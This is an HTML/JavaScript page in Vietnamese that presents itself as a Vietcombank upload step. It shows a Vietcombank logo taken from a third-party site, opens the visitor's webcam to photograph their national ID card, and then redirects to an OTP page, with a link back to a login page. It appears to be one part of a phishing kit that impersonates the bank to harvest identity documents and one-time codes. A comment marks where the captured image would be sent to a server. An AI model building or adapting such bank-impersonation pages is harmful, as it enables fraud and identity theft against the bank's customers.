<!DOCTYPE html>
<html>
<head>
    <title>Tải lên CMND/CCCD</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container upload-container">
        <img src="https://sanfactory.vn/wp-content/uploads/2023/10/logo-vietcombank-2-1400x645.png" alt="Vietcombank Logo" class="bank-logo">
        <form id="uploadForm">
            <div class="preview-container">
                <video id="camera" autoplay></video>
                <img id="preview" alt="Image preview">
                <p id="placeholder">Tải lên hoặc chụp ảnh CMND/CCCD của bạn</p>
                <!-- Added hidden canvas for capturing photo -->
                <canvas id="canvas" style="display: none;"></canvas>
            </div>
            <div class="upload-options">
                <button type="button" class="upload-btn" id="cameraBtn">Chụp ảnh</button>

            </div>
            <button type="submit" class="upload-btn" id="submitBtn">
                <span>Xác nhận</span>
                <div class="spinner"></div>
            </button>
        </form>
        <button onclick="window.location.href='login.html'" class="link-btn">
            Quay lại trang đăng nhập
        </button>
    </div>

    <script>
        const camera = document.getElementById('camera');
        const preview = document.getElementById('preview');
        const placeholder = document.getElementById('placeholder');
        const cameraBtn = document.getElementById('cameraBtn');
        const canvas = document.getElementById('canvas');
        let stream = null;

        cameraBtn.addEventListener('click', async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                camera.srcObject = stream;
                camera.style.display = 'block';
                preview.style.display = 'none';
                placeholder.style.display = 'none';
            } catch (err) {
                alert('Không thể truy cập camera: ' + err);
            }
        });

        // Removed fileBtn and fileInput event listeners

        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (stream) {
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                
                // Set canvas dimensions to match video
                canvas.width = settings.width || camera.videoWidth;
                canvas.height = settings.height || camera.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(camera, 0, 0, canvas.width, canvas.height);
                
                // Convert canvas to blob
                canvas.toBlob(blob => {
                    if (blob) {
                        // You can send the blob to the server here
                        // For demonstration, we'll just display it
                        const imgUrl = URL.createObjectURL(blob);
                        preview.src = imgUrl;
                        preview.style.display = 'block';
                        camera.style.display = 'none';
                        placeholder.style.display = 'none';
                        
                        // Stop the camera
                        stream.getTracks().forEach(track => track.stop());

                        // Proceed with submission logic
                        // Show loading state
                        const submitBtn = this.querySelector('#submitBtn');
                        const spinner = submitBtn.querySelector('.spinner');
                        submitBtn.classList.add('loading');
                        spinner.style.display = 'block';
                        
                        // Redirect to OTP page after short delay
                        setTimeout(() => {
                            window.location.href = 'OTP.html?from=register';
                        }, 1500);
                    } else {
                        alert('Không thể chụp ảnh. Vui lòng thử lại.');
                    }
                }, 'image/png');
            } else {
                alert('Vui lòng chụp ảnh CMND/CCCD của bạn trước khi xác nhận.');
            }
        });
    </script>
</body>
</html>
